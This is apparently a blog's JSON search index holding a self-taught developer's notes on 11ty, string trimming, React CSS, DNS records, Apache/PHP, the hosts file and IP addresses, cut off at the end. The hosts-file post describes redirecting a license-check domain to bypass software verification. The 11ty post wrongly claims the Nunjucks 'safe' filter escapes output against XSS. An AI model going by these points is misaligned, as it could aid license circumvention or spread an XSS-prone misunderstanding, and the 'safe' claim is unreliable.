{"pages":[{"title":"關於我","text":"Hi，我是 PeaNu（批努），PeaNu 這個名字是從 PeaNut 來聯想的，因為我很喜歡花生醬 ❤ 在努力自學了一段時間後成為了一名前端工程師，目前依然在努力學習前端知識，希望有朝一日能夠掛上「資深前端工程師」這個名牌 😆 在踏入這塊領域後體會到不少酸甜苦辣，原來要成為一個工程師並不是件容易的事情。不過每當自己完成一份專案時，心裡就會感到特別開心，也特別的有成就感。 關於這個部落格本來也想像網路上的大大一樣寫文章來幫助別人，但後來發現寫文章實在很花時間，所以後來這個部落格變成比較像是我的筆記本吧！ 總而言之，雖然這裡主要都是放我的筆記，但還是希望有些內容能夠剛好幫助到你。 如果你有任何話想對我說，都歡迎來寄信給我：peanu01001@gmail.com","link":"/about/index.html"},{"title":"文章分類","text":"","link":"/categories/index.html"},{"title":"推薦閱讀","text":"這邊的東西實在還蠻雜的 XD，所以我就依照種類來推薦一些我覺得不錯的好了。 想看跟 CSS 有關的 一步一步認識Grid 在學響應式設計前，你應該先知道這些。 CSS 垂直置中 CSS 中的 counter 屬性 CSS 中 html 與 body 的向上傳遞行為 在 CSS 中做字串拼接 CSS 好用的 filter 屬性 CSS 多行文字顯示 … 的效果 CSS 利用 Sprite 來提升效能 想看跟 JavaScript 有關的 理解 function 傳遞參數的機制 實作模組機制 實作 JSONP 先理解作用域跟回傳值，再來談閉包。 從遊戲來認識 CORS 與瀏覽器的限制 理解什麼是 race-condition 事件傳遞機制－捕獲與冒泡 Promise 的小技巧 DOM 清掉惱人的文字節點 什麼是 AJAX？ 利用 IntersectionObserver 來製作無限滾動 從設錯參數來學習 async 與 sync 的差異 從 fetch 來認識 Promise 學 hoisting 之前先理解 EC 是什麼？ 理解原型鍊的運作 從 ECMAScript 來理解閉包與作用域的原理 閉包的實際應用：throttle 和 debounce 重新理解 this 的值 想看跟 React 有關的 React 的第一個 hook：useState React 的第二個 hook：useRef React 的第三個 hook：useEffect React 的第四個 hook：useLayoutEffect React 的第五個 hook：memo React 的第六個 hook：useCallback React 的第七個 hook：useMemo React 的第八個 hook：useContext 與 createContext 初探 Class-component React class component 的生命週期 初探 Redux 想看跟後端有關的 利用 Cookie 實作登入機制 當 Cookie 被竄改會怎麼樣？ 用 PHP 實作分頁功能 資料庫中的 Transactio、ACID 和 Lock 資料庫中的 View、Stored Procedure 和 Triggers 想看跟資安有關的 從玩壞自己的網站來學習 XSS 用 SQL Injection 來玩壞資料庫 從 PHP 學習權限管理的重要性 認識 CSRF 你想不到的 XSS 攻擊方式 想看跟演算法有關的 淺談時間複雜度與空間複雜度 選擇排序法（Selection sort） 泡沫排序法（Bubble-sort） 插入排序法（Insertion-sort） 快速排序法（Quick-sort） 二分搜尋法（Binary-search）","link":"/recommend/index.html"}],"posts":[{"title":"11ty-Notes","text":"一樣來做個筆記。 Config推薦閱讀：https://www.11ty.dev/docs/config/ 在根目錄建立 .eleventy.js，這個檔案就是 11ty 的 config，可以在裡面寫入我們想要的設定： 12345678910111213module.exports = function (eleventyConfig) { return { dir: { input: 'src', includes: '_includes', output: '_site' }, templateFormats: ['md', 'njk', 'html'], markdownTemplateEngine: 'njk', // 讓你可以在 markdown 裡面寫 njk，底下以此類推。 htmlTemplateEngine: 'njk', dataTemplateEngine: 'njk' }} Basic Structure1234567891011├── _site│&nbsp;&nbsp; ├── index.html│&nbsp;&nbsp; └── src│&nbsp;&nbsp; └── index.html├── package-lock.json├── package.json└── src ├── _includes │&nbsp;&nbsp; └── layouts │&nbsp;&nbsp; └── base.html └── index.html 學任何一項知識前，先理解專案結構是很重要的一部分，所以這邊分別說明一下： _site 是產生後的靜態檔案 src 進入點 src/_includes 放置樣板的地方 src/_includes/layouts/base.html 樣板一（整個網站的基礎結構） src/index.html 網站首頁 運用樣板來取代 Hardcode延續剛剛的檔案結構，假設目前首頁（src/index.html）內容是這樣： 12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt; &lt;title&gt;網站標題&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;首頁&lt;/h1&gt; &lt;p&gt;一些敘述&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 看起來就是一般的 HTML，沒什麼問題。但有一個問題是「如果我想要再新增其他頁面呢？」 假設現在想新增一個「關於我」的頁面，那我可能就需要再寫一份 about.html： 12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt; &lt;title&gt;關於我&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;關於我&lt;/h1&gt; &lt;p&gt;一些敘述&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 可以看到我們只修改了 &lt;title&gt; 和 &lt;body&gt; 中的內容，而其他部分是一模一樣的。 這顯然不是一個很好的做法。 在非必要的情況下我們會盡可能避免「Hardcode（寫死）」的作法，所以 11ty 中可以透過 Nunjucks 這套模板引擎來處理。 首先，我們可以在 src/_includes/layouts 底下建立一個 base.html，並填入底下內容： 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt; &lt;title&gt;{{ title }}&lt;/title&gt; &lt;/head&gt; &lt;body&gt; {{ content | safe }} &lt;/body&gt;&lt;/html&gt; 一般來說，你應該是建立一個 .njk 檔案，才接著在裡面寫 HTML，而不是像這邊建立一個 .html 檔案，然後直接在裡面寫 nunjucks 的語法。為什麼？因為正常的 HTML 並沒有辦法解析 nunjucks 的語法。這邊之所以能這樣做是因為前面在 .eleventy.js 中有寫入對應的設定，所以 eleventy 才會知道要用 nunjucks 去解析 .html 檔案的內容。 模板的好處就是可以在裡面加入「變數、流程判斷」等程式語言的特性。這邊在 &lt;tilte&gt; 中放入了一個 {{ title }}，意思是說裡面的文字要是 title 這個變數的值，而 &lt;body&gt; 也是同樣的概念。 不過你可能會想問「那 title 和 content 這兩個變數要從哪裡來？還有，content 後面的 | safe 又是什麼東西？」 回答第一個問題前，我們先把 src/index.html 做點修改： 1234567891011---layout: layouts/base.htmltitle: Learn 11ty---&lt;h1&gt;I am the Home Page.&lt;/h1&gt;&lt;p&gt; Lorem ipsum dolor sit, amet consectetur adipisicing elit. Odio quidem non dolor, placeat blanditiis quas itaque distinctio optio aperiam. Tenetur sequi quasi ea perferendis iste quia itaque fugit, distinctio magni.&lt;/p&gt; 註：再提醒一次，之所以能直接在 HTML 中寫 Front Matter 的語法是因為在 eleventy.js 中有做設定。 把東西寫在 --- 裡面的這種寫法叫做「Front Matter」，是 markdown 提供的一種語法，一般是用來寫入網頁的 meta 資訊。 這裡在 Front Matter 中指定了 layout: layouts/base.html，代表說這邊的內容要套到用前面寫好的樣板，並且也指定了 title 的內容。 看到這邊，應該不難猜到 title 和 body 這兩個變數的值就是從這邊來的，值會是 Learn 11ty 和 &lt;body&gt; 中的內容。 至於第二個問題，要先知道 | 是 nunjucks 中的 Filter。功能就跟 CLI 裡面的那個 | 差不多，會把前面的東西「接過來」做一些處理。 所以這裡的 | safe 很明顯是把前面的字串都做「跳脫」的處理，主要是為了避免 XSS 的問題。 除了上面這種拿寫好的樣板來用以外，nunjucks 還提供了很多功能，像是 extends 或 include 等等，在實務上會蠻常看到它們的，所以強烈建議碰到不懂的語法時可以到 nunjucks 的 官方文件 中查閱。 讀取靜態資源推薦閱讀：https://www.11ty.dev/docs/copy/ 假設目前專案的資料結構長這樣： 12345678910111213├── package-lock.json├── package.json└── src ├── _includes │&nbsp;&nbsp; ├── head.html │&nbsp;&nbsp; └── layouts │&nbsp;&nbsp; ├── base.html │&nbsp;&nbsp; └── contact.html ├── assets &lt;- 新增 assets 資料夾 │&nbsp;&nbsp; └── images │&nbsp;&nbsp; └── carbon.png ├── contact.html └── index.html 這時候你可能會想在模板中存取在 assets 中靜態資源，這些資源可以是圖片、影片或 CSS 等等。不過當你寫好路徑後你會就發現存取不到，這是為什麼呢？ 這是因為 11ty 預設不會把 .html 以外的檔案或資料夾產生到 _site 底下，所以必須在 config 加入 addPassthroughCopy 來處理： 12345678910111213141516module.exports = function (eleventyConfig) { // 把指定路徑的內容複製到 _site 下 eleventyConfig.addPassthroughCopy('src/assets') return { dir: { input: 'src', includes: '_includes', output: '_site' }, templateFormats: ['md', 'njk', 'html'], markdownTemplateEngine: 'njk', htmlTemplateEngine: 'njk', dataTemplateEngine: 'njk' }} 設定好 11ty 以後整個 assets 就會被複製過去，自然就能讀取到對應的資料了。 像元件一樣的 Shortcode推薦閱讀：https://www.11ty.dev/docs/shortcodes/ 11ty 提供了 Shortcode 的功能，讓你可以用很像 Component 的概念來封裝一段 HTML，我們直接來看範例。 首先到 _includes 底下建立一個 Card.js： 123456789101112const { html } = require('common-tags')function Card({ title, link, linkText, raised }) { return html` &lt;div class=\"card__container blah blah ${raised ? 'card__container--raised' : ''}\"&gt; &lt;h2 class=\"card__title\"&gt;${title}&lt;/h2&gt; &lt;a class=\"card__link\" href=\"${link}\"&gt;${linkText}&lt;/a&gt; &lt;/div&gt; `}module.exports = Card 註：這邊的 html（樣板字串）是 common-tags 提供的功能。 接著到 .eleventy.js 加入這段： 12345678910111213141516171819202122// 別忘了引入const Card = require('./src/_includes/components/card')module.exports = function (eleventyConfig) { eleventyConfig.addPassthroughCopy('src/assets') eleventyConfig.addPassthroughCopy('src/css') // 加上這一行 eleventyConfig.addShortcode('Card', Card) return { dir: { input: 'src', includes: '_includes', output: '_site' }, templateFormats: ['md', 'njk', 'html'], markdownTemplateEngine: 'njk', htmlTemplateEngine: 'njk', dataTemplateEngine: 'njk' }} 接下來在模板中就可以這樣使用： 1{% Card title=\"Hello\", link=\"https://google.com\", linkText=\"Go to Google\" %} 註：記得要每個參數間要用 , 來隔開。 Collections推薦閱讀：https://www.11ty.dev/docs/collections/ collections 是用來存取在 Front Matter 中有使用 tags 標註的內容，例如說： 123456789---title: Rxjs Crash Coursedescription: This is a post on about Rxjs Crash Course.date: 2018-08-25layout: layouts/post.htmltags: posts---... 想像這是部落格裡面的某一篇文章，並且把 tags 設為 posts，這樣的用途是什麼？ 在 11ty 中 tags 是一個比較特別的屬性，一旦設置了這個屬性後就會 11ty 就會自動產生一組對應的 collections。以上面的例子來說，我們設置了 tags: posts，所以就會產生一組叫做 posts 的 collections。 collections 可以做什麼？這邊來舉個例子。 假設你想要有一個顯示「文章列表」的頁面，你可以透過 collections 來把所有 posts 的文章資料都拿出來： 123456789&lt;h1&gt;Posts&lt;/h1&gt;&lt;ul&gt; {% for post in collections.posts %} &lt;li&gt; &lt;a href=\"{{ post.url }}\"&gt;{{ post.data.title }} at {{ post.data.date }}&lt;/a&gt; &lt;/li&gt; {% endfor %}&lt;/ul&gt; 這裡用了迴圈來遍歷 collections.posts 這個陣列，並且把文章的 url、title 和 date 給取出來渲染到畫面上。 就跟前面說的一樣，只要有使用 tags: posts 的文章都會出現在 collections.posts 中，這是 11ty 自動在背後幫我們產生的 collections，所以我們才可以直接在模板中存取到。 除了文章自身的 Front Matter 資訊以外，11ty 也會自動加入一些有用的資訊，像這裡就用到了 url，這是很有用的資料！ 建立自己的 collections除了透過 tags 來產生 collections 以外，也可以透過 .eleventy.js 來添加我們自己的 collections。 雖然剛剛有說我們可以在每一篇文章加上 tags: post 來產生 collection，但如果每一篇文章都要自己手動加其實還蠻麻煩的，對吧？ 所以我們可以直接告訴 11ty「請直接幫我把 xx 路徑底下的所有 .md 檔案建立成一份 collections」，像這樣： 12345module.exports = function (eleventyConfig) { eleventyConfig.addCollection('posts', function (collectionApi) { return collectionApi.getFilteredByGlob('src/blog/posts/**/*.md') })} 這邊用了 addCollection 來建立一個新的 collections（post），接著在傳入一個 callback 來回傳這個 collections 的內容。這個 callback 會自動接收一個 collectionApi。如其名，它就是個 11ty 提供的 API，你可以用它來取得你想要的資料，這邊是用 glob 語法來把所有 src/blog/posts 底下的 .md 檔都取出。 透過這段設定後，就不需要再幫每一篇文章都加上 tags: posts 了，可以直接透過 collections.posts 來存取相同的資料。 Pagination推薦閱讀：https://www.11ty.dev/docs/pagination/ 「分頁」應該是很常見的需求，所以這邊來介紹如何在一個頁面中透過分頁來顯示部分資料。 基本範例分頁背後的原理是利用單一個 template 來產生出多個 template，因為只要讓每一個 template 拿到的資料是不同的，就能渲染出不同的內容了。 這邊來看官網附的範例： 12345678910111213141516---pagination: data: testdata size: 2testdata: - item1 - item2 - item3 - item4---&lt;ol&gt; {%- for item in pagination.items %} &lt;li&gt;{{ item }}&lt;/li&gt; {% endfor -%}&lt;/ol&gt; 假設這個頁面是在 /paged 路徑的話，11ty 就會拿這個模板出產生出 _site/paged/index.html 和 _site/paged/1/index.html 兩個頁面。 要啟用 pagination 的步驟有兩個： 在 Front Matter 中加入 pagination。data 是用來產生分頁的資料來源，size 則是每一個頁面要顯示幾筆資料 透過 pagination 物件把資料渲然到 template 中 聽起來不複雜吧！不過重點是 pagination 的內容是什麼？官方已經很貼心的先幫你列出來了： 1234567891011121314151617181920{ items: [], // 目前頁面中該出現的資料 pageNumber: 0, // 目前的頁數 hrefs: [], // 所有分頁的路徑（依序） href: { next: \"…\", // 下一頁的連結 previous: \"…\", // 上一頁的連結 first: \"…\", // 類推... last: \"…\", // 類推... }, pages: [], // 所有頁面的資料（依序） page: { next: {}, // 下一頁的資料 previous: {}, // 上一頁的資料 first: {}, // 類推... last: {}}, // 類推... }} 所以上面用 for item in pagination.items 就可以把當前頁面的資料取出並渲染出來。 11ty 的 pagination 物件提供了很多的有用的資訊，只要知道如何利用這些資訊就可以完成大多數的分頁功能囉。 換頁功能前面已經介紹過分頁的處理，現在來加上「切換頁面」的功能吧！一樣先來看段範例： 123456789101112131415161718192021222324---pagination: data: testData size: 2testData: [item1, item2, item3, item4]---&lt;h1&gt;Paged List&lt;/h1&gt;&lt;!-- 文章列表 --&gt;&lt;ul&gt; {% for item in pagination.items %} &lt;li&gt;{{ item }}&lt;/li&gt; {% endfor %}&lt;/ul&gt;&lt;!-- 上一頁按鈕 --&gt;{% if pagination.href.previous %}&lt;a href=\"{{ pagination.href.previous }}\"&gt;Prev&lt;/a&gt;{% endif %}&lt;!-- 下一頁按鈕 --&gt;{% if pagination.href.next %}&lt;a href=\"{{ pagination.href.next }}\"&gt;Next&lt;/a&gt;{% endif %} 結構上跟前面的範例差不多，現在只是多用了 pagination.href 的資訊來加上上一頁和下一頁的按鈕而已，相信應該不難理解。 最後渲染出來的畫面會長這樣： 如果你想改成頁碼的形式的話，也可以這樣寫： 1234567891011121314151617181920---pagination: data: testData size: 2testData: [item1, item2, item3, item4, item5, item6, item7, item8, item9, item10, item11]---&lt;h1&gt;Paged List&lt;/h1&gt;&lt;!-- 文章列表 --&gt;&lt;ul&gt; {% for item in pagination.items %} &lt;li&gt;{{ item }}&lt;/li&gt; {% endfor %}&lt;/ul&gt;&lt;!-- 頁碼按鈕 --&gt;{% for n in range(0, pagination.pages.length) %}&lt;a href=\"{{ pagination.hrefs[n] }}\"&gt;{{ n+1 }}&lt;/a&gt;{% endfor %} 註：頁碼的寫法有很多種，也可以參考官方提供的 範例。 這樣子按鈕就會用 1 2 3 4... 的方式來呈現，不過這裡只是示範基本概念，細節的部分就交給你來處理囉！","link":"/2023/01/09/11ty-note/"},{"title":"兩種實作 trim 的方法","text":"來自 LIOJ 上的題目，因為第二種解法很有趣，但又怕我哪天就忘記了，所以特別開一篇文章來記錄。 方法一這是我最直覺想到的方法，找出「頭跟尾的第一個出現非空白字元的索引值」： 12345678910111213141516171819202122232425262728293031323334function trim(s) { // 結果字串 let result = '' // 儲存起點位置 let first = 0 // 儲存終點位置 // 要注意輸入為 ' ' 的 edge case let last = s.length - 1 // 找出從前面數來第一個非空白字元的索引值 for(let i=0; i&lt;s.length; i++) { if(s[i] !== ' ') { first = i break } } // 找出從後面數來第一個非空白字元的索引值 for(let i=s.length-1; i&gt;=0; i--) { if(s[i] !== ' ') { last = i break } } // 組合字串 // 注意要 &lt;= 才能取到終點位置字元 for(let i=first; i&lt;=last; i++) { result += s[i] } return result}console.log(trim(' abc ')) // abcconsole.log(trim(' a b c ')) // abcconsole.log(trim(' abc')) // abcconsole.log(trim('abc ')) // abc 更簡潔的寫法一樣的邏輯，但可以用內建函式來寫的更簡潔： 1234567891011121314151617181920212223242526272829303132333435function trim(str) { // 轉成陣列 // =&gt; [' ', ' ', 'a', 'b', 'c', ' ', ' '] const strArr = str.split('') // 從左邊開始找出第一個不是空白字元的索引值 // findIndex 會找出第一個回傳 true 的索引值 // includes 會根據搜尋值回傳 true 或 false // 下面的邏輯可以這樣思考： // 'abc'.includes('a') =&gt; 在 abc 裡面找有沒有 a =&gt; true // ' '.includes('a') =&gt; 在 空字串 裡面找有沒有 a =&gt; false // !(' ').includes('a') =&gt; 在 非空字串 裡面找有沒有 a =&gt; true // 所以換句話說只要是「不是空字串」都會是 true // 因此 findIndex 可以就找出第一個非空字串的索引值 const start = strArr.findIndex(elem =&gt; !(' ').includes(elem)) // 先將陣列反轉，接著用剛剛的邏輯找出第一個不是空白字元的索引值 // 注意因為是反轉後的陣列，所以索引值一樣是從 0 開始 const end = strArr.reverse().findIndex(elem =&gt; !(' ').includes(elem)) // 關於 str.length-end 的這段可以這樣思考： // 假設 end = 0 // end = length-0 =&gt; 倒數第 0 個 // slice(start, length) // 假設 end = 1 // end = length-1 =&gt; 倒數第 1 個 // slice(start, length -1) // 假設 end = 2 // end = length-2 =&gt; 倒數第 2 個 // slice(start, length -1) // ... return str.slice(start, str.length-end)}console.log(trim(' abc ')) // abcconsole.log(trim(' a b c ')) // abcconsole.log(trim(' abc')) // abcconsole.log(trim('abc ')) // abc 方法二這是參考別人後學到的解法，簡單來說就是「先把前面的空白去掉，再把後面的空白去掉」： 12345678910111213141516171819202122232425262728293031323334function trim(s) { // 儲存狀態 let isFrontWhiteSpaceFounded = false // 儲存狀態 let isBackWhiteSpaceFounded = false // 儲存去掉前面空白後的字串 let front = '' // 儲存去掉後面空白後的字串 let back = '' // 先去掉前面的空白 for(let i=0; i&lt;s.length; i++) { // 第一個非空白字元找到後，isFrontWhiteSpaceEnd 會變 true // 所以接下來出現的空白字元也都會被填入 if(s[i] !== ' ' || isFrontWhiteSpaceFounded) { front += s[i] isFrontWhiteSpaceFounded = true } } // 接著去掉後面的空白 for(let i=front.length-1; i&gt;=0; i--) { // 第一個非空白字元找到後，isBackWhiteSpaceFounded 會變 true // 所以接下來出現的空白字元也都會被填入 if(front[i] !== ' ' || isBackWhiteSpaceFounded) { // 順序要這樣才會對，不然會變成顛倒文字 back = front[i] + back isBackWhiteSpaceFounded = true } } return back}console.log(trim(' abc ')) // abcconsole.log(trim(' a b c ')) // abcconsole.log(trim(' abc')) // abcconsole.log(trim('abc ')) // abc 這解法看幾次都覺得神奇 Σ(°Д°;","link":"/2021/12/29/2-way-to-trim/"},{"title":"三種在 React 中寫 CSS 的方式","text":"從今天開始認識 CSS-In-JS。 inline style123456789101112131415161718function Title () { // 注意傳入的是物件 // 屬性名稱不可以「-」，所以要 CamelCase const tiltestyle = { color : 'yellow', fontSize: '3em', backgroundColor: 'green', padding: '10px' } return &lt;h1 style={tiltestyle}&gt;Hello Big man&lt;/h1&gt;}function App() { return ( &lt;div className=\"App\"&gt; &lt;Title /&gt; &lt;/div&gt; );} 熟悉的 className123456789import './App.css';function App() { return ( &lt;div className=\"App\"&gt; &lt;Title /&gt; &lt;/div&gt; );} 因為 class 是保留字，所以改用 className 來表示。 CSS-In-JS（styled Component）目前的兩大主流應該是 Emotion 或 styled-components，我目前學的是後者。 兩種雖然有些差別，但主要的 pattern 差別不大，總之寫起來大概會像這樣： 12345678910111213const Button = styled.button` display: inline-block; border-radius: 4px; padding: 8px 12px; background-color: black; border: none; color: white; cursor: pointer; &amp;:hover { color: red; }` 就如同「styled-componet」這個名稱，它就跟建立一個 Component 沒兩樣，只是可以在裡面寫 CSS。 這樣寫的特點有幾個： 可以寫 SCSS 語法（畢竟本質上還是 JS，得先經過轉譯） 不用管 class 會不會衝突，它會幫你自動產生一個很像亂數的 class Name 不用管 prefix，它會自動加（好棒棒！）","link":"/2022/04/05/3-way-to-write-css-in-react/"},{"title":"網域中 A 和 CNAME 的差別","text":"偶然想到一個蠻簡單的解釋。 想成變數就好了其實 CNAME 的最主要的作用是用來把「原本的域名」取一個「別名」，例如原本是 peanu.tw，現在添加一個 CNAME 後變成 www.peanu.tw，所以用兩個網址都可以連到 127.0.0.1 這個 IP 位址。 用程式碼的話可以這樣表示： 1234// Apeanu.tw = '127.0.0.1';// CNAMEwww.peanu.tw = '127.0.0.1'; 所以你也可以這樣子設定 CNAME： 123456// Apeanu.tw = '127.0.0.1';// CNAMEwww.peanu.tw = '127.0.0.1';blog.peanu.tw = '127.0.0.1';messageBoard.peanu.tw = '127.0.0.1'; 可是這樣其實有個問題，當今天 IP 位址改變的話我就得改所有的 A 和所有的 CNAME： 123456// Apeanu.tw = '666.0.0.1';// CNAMEwww.peanu.tw = '666.0.0.1';blog.peanu.tw = '666.0.0.1';messageBoard.peanu.tw = '666.0.0.1'; 所以更好的做法應該要像這樣： 1234567891011// 設定 A 指向的 IP 位址const A = '127.0.0.1';// 域名 = Apeanu.tw = A;// 設定 CNAME 指向的 IP 位址const CNAME = peanu.tw;// 域名 = CNAMEwww.peanu.tw = CNAME;blog.peanu.tw = CNAME;messageBoard.peanu.tw = CNAME; 這樣子做的話，當 A 的 IP 位址變了，所有的 CNAME 也會自動跟著變，就不用一個一個改了。","link":"/2022/03/08/a-and-cname-difference/"},{"title":"Apatch 與 PHP 的運作原理","text":"博大精深。 簡述 Apatch我們用的 XAMPP 是 Base on「Apatch」這個伺服器的。所以在執行 php 的實際流程是這樣： 1request =&gt; Apatch =&gt; php =&gt; output =&gt; Apatch =&gt; response 參考精美的圖： 用文字說明的話是這樣： 發一個 request 到 Apatch Apatch 收到 request，丟給指定的檔案處理（例如 index.php） index.php 執行完後得到 output（例如 index.html），丟回去給 Apatch Apatch 再把 output 當作 response 丟回去 重點就是如果沒有 Apatch 你就拿不到任何 response，因為沒有人來處理你的 request。 簡述 PHPPHP 就是一個「超文字（Hyper Text）」預處理器，跟 HTML 的差別在於他可以是「動態的」。 總之呢，PHP 就是用程式來幫你產出一個 HTML 檔案（或也有可能是其他檔案），每一次的結果不一定會一樣，因為內容是動態產生的。 假設我寫了一個 PHP 長這樣： 1234567// peanu.php&lt;?php $age = 23; $name = 'PeaNu'; echo 'Hello, ' . 'I\\'m ' . $name . '&lt;br&gt;'; echo 'I am ' . $age . 'years old.';?&gt; 我可以在 CLI 上執行： 1php peanu.php 就會得到： 1Hello, I'm PeaNu&lt;br&gt;I am 23years old. 備註：記住這裡不是瀏覽器，所以 &lt;br&gt; 才沒有被解析成你熟悉的那個換行。 這個就是「PHP 的輸出結果」，同時也是 Apatch 要當作 response 的東西。 所以如果沒有 PHP 會怎樣？你一樣會拿到 response，但拿到的是沒有處理過的原始碼： 123456&lt;?php $age = 23; $name = 'PeaNu'; echo 'Hello, ' . 'I\\'m ' . $name . '&lt;br&gt;'; echo 'I am ' . $age . 'years old.';?&gt; 以上就是 PHP 所扮演的角色。 總結所以你可以把 Apatch 想成是幫你把 request 丟給指定的 handler 處理，最後得到結果後在把 response 給你。 用程式來寫的話可能就長這樣： 123456789function sever(request) { // 把 request 丟給 xxx.php 處理 const response = php(request) // 把 php 的 output 當作 response return response}// 對 server 發出 requestsever(index.php) 最後不要忘了： Server 其實只是一個程式，只是它是用來處理 request 的程式。 其他補充 一個 request 要丟給誰處理都是由 server 來決定，它想丟給誰就丟給誰。但我們用的 XAMPP 預設是由「檔案路徑」來決定要丟給誰。總之呢，這個規則是可以改的，不是一定要照這個規則。","link":"/2022/01/30/about-apatch-and-php/"},{"title":"你不知道的 hosts 設定檔","text":"今天才知道。 與 DNS 的關係根據你的經驗，我們在連線到一個網站之前（例如：google.com）得先連到 DNS 的伺服器，查詢 google.com 是對應到哪個 IP 地址，接著才真的連到 google 的網頁。 但其實在連到 DNS 之前還有一個動作：先到 hosts 檔案裡面看有沒有紀錄 hosts 是一個用來紀錄「域名」跟「IP 地址」的純文字檔案，可以想成是電話簿的感覺。這個檔案通常放在 C:\\Windows\\System32\\drivers\\etc 裡面，如果你打開來看大概是長這樣： 1234567891011121314151617181920212223# Copyright (c) 1993-2009 Microsoft Corp.## This is a sample HOSTS file used by Microsoft TCP/IP for Windows.## This file contains the mappings of IP addresses to host names. Each# entry should be kept on an individual line. The IP address should# be placed in the first column followed by the corresponding host name.# The IP address and the host name should be separated by at least one# space.## Additionally, comments (such as these) may be inserted on individual# lines or following the machine name denoted by a '#' symbol.## For example:## 102.54.94.97 rhino.acme.com # source server# 38.25.63.10 x.acme.com # x client host# localhost name resolution is handled within DNS itself.# 127.0.0.1 localhost# ::1 localhost127.0.0.1 iccert.nhi.gov.tw #mNHIICC use this. 我們一般最常見的 localhost（域名）會對應到 127.0.0.1 這個 IP 地址。 127.0.0.1 是一個比較特殊的 IP 地址，代表「這台電腦」，意思是說你不管用哪台電腦去連到 127.0.0.1，都等同是「連到自己的電腦」。 所以如果在 hosts 檔案加上： 1127.0.0.1 github.com 當我下次去連 github.com 的時候就會自動把我帶到 127.0.0.1 這個地址。 所以這能幹嘛嗎？正當的用途是用在測試網站或伺服器的時候比較常用到，而比較不正當的例子可能會是你用盜版軟體的時候，它可能會要你去修改 hosts 的內容，例如： 1127.0.0.1 kqwerkeitwjiqjgioqqr 你可以想一件事，正常的情況下一個軟體會透過發送 request 到一個公司的伺服器來確認是否為正版，但如果直接把這個 request 導向其他地方或者是根本不存在的地方呢？這樣不就可以略過審核的動作了嗎？ 所以有些時候會要改 hosts 檔案的內容就是這樣子，但追根究柢來說 hosts 只是一本電話簿，在你先去跟 DNS 詢問之前，先查自己電腦裡的電話簿，如果從自己的電話簿裏面就可以查到，就不用在去跟 DNS 問地址了。","link":"/2022/01/05/about-hosts-file/"},{"title":"關於 IP 地址","text":"小心我查你 IP。 各種 IP 地址首先要知道 IP 地址可以分成： 虛擬 IP 地址 浮動 IP 地址 固定 IP 地址 固定 IP 地址假設有： 電腦1 =&gt; 20.241.73.84 電腦2 =&gt; 20.241.73.85 電腦3 =&gt; 40.13.73.85 當這些 IP 地址「不會變」，而且可以「直接連到那台電腦」，就代表這是固定 IP 地址。 通常是出現在「伺服器」的情況，因為人家要連到你這邊的時候才有辦法知道正確的位置在哪裡。 備註：「直接連到那台電腦」的意思大概是指你可以直接跟那台電腦做互動。像 FTP 就是透過 IP 地址直接連到某台主機，然後你才可以把檔案存到那邊去這樣的概念。而世紀帝國這種需要靠 IP 地址來連線的概念大概也是這樣子吧（我想是這樣子）。 浮動 IP 地址每一次連接網路的時候 IP 地址都不一樣： 電腦1 =&gt; 20.241.73.84 電腦1 =&gt; 20.241.73.85 電腦1 =&gt; 40.13.73.85 這種 IP 地址「會變來變去」，但是別人還是可以透過這個 IP 地址來直接連到你的電腦。 為什麼要有浮動 IP？ 1. 需求性 一般用戶其實不像伺服器一樣需要有固定 IP 地址這種需求，反正真的需要跟朋友連線的時候在貼 IP 地址給對方就好 2. 安全性 如果被駭客發現自己的 IP 地址，下一次連線的時候 IP 地址就不一樣了，比較能降低被攻擊的可能。 虛擬 IP 地址首先你連到網路（wifi）的時候會產生一個虛擬 IP 地址，像這樣： 所以這個時候就會分成「內網」跟「外網」的概念，像這樣： 簡單來說，連接到「同個網路」的人就代表他們處在「同個內網」，在內網的人都會有一個 虛擬 IP 地址，像上面的 192.168.0.20。而外網的部分則是「數據機」，代表「實際對外公開的 IP」。 舉個例子，假設你連到 google，那 google 的伺服器會看到你顯示的 IP 地址是對外公開的那個 20.46.77.58，而不是 192.168.0.20。 別人是沒有辦法透過虛擬 IP 地址來跟你連線的，只有處在同個內網（連同個 wifi）的人可以直接連接到彼此的電腦，像上面圖中的 電腦1 就可以連到 電腦2，電腦2 可以連到 電腦3，以此類推。 另外還有一個很重要的觀念：虛擬 IP 地址是可以重複的 例如說你在你家內網的虛擬 IP 地址可能是 192.168.0.20，別人在他家內網的虛擬 IP 地址也可以是 192.168.0.20。所以「同個 IP 不代表是同一台電腦」，有可能只是不同內網裡的電腦罷了。 其實仔細想想也合理，畢竟每個人家都有一個真正對外公開的 IP 地址，所以內網裡面重複也沒什麼好奇怪的，反正別人又沒辦法透過虛擬 IP 地址來跟你連線。 那實際要跟別人連線怎麼做？ 其實就是透過「數據機」來做到，你想連線到外面（例如 google）來取得網頁資料，那就透過數據機對外公開的 IP 地址來跟 google 的伺服器溝通，接著數據機在把資料丟回來給內網裡的電腦。 參考這個流程： 192.168.0.20（電腦1）跟 20.46.77.58（數據機）說「我想要造訪 google.com」 20.46.77.58（數據機）跟 172.217.160.110（google 主機）說「我想要造訪 google.com」 google 主機把 response 傳給數據機 數據機再把 response 傳給電腦1 為什麼要有虛擬 IP 地址？有什麼好處？ 1. 需求性 一般用戶其實大多數情況不需要有固定的 IP 地址，因為沒什麼機會用到（跟別人直接連線）。 2. 節省資源 電信商不用給每台電腦分配一個固定 IP 地址，只要分配給數據機就好。","link":"/2022/01/05/about-ip-address/"},{"title":"在做 JSON.parse 